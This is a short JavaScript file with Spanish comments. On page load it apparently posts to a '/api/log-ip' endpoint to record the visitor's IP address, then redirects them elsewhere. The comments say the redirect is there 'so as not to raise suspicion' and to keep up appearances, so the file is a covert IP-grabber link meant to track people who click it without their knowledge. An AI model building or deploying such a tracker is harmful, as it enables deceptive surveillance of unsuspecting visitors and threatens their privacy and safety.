// js/script.js

// Función autoejecutable para que se ejecute inmediatamente al cargar la página
(async () => {
  try {
    // Llama a nuestra API de Vercel
    const response = await fetch('/api/log-ip', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
    });

    if (!response.ok) {
      console.error('La respuesta de la API no fue ok:', response.statusText);
    }

    // Esperar un poco para asegurar que el fetch se complete antes de redirigir
    await new Promise(resolve => setTimeout(resolve, 500));

    // Redirigir al usuario a tu perfil de Instagram para no levantar sospechas
    window.location.href = 'https://markethouseproyect.vercel.app/index.html'; // <-- ¡CAMBIA ESTO!

  } catch (error) {
    console.error('Error al registrar la IP:', error);
    // Incluso si hay un error, redirigimos para no romper la apariencia
    window.location.href = 'https://markethouseproyect.vercel.app/index.html'; // <-- ¡CAMBIA ESTO TAMBIÉN!
  }
})();

// El resto de tu código JavaScript puede ir aquí abajo...
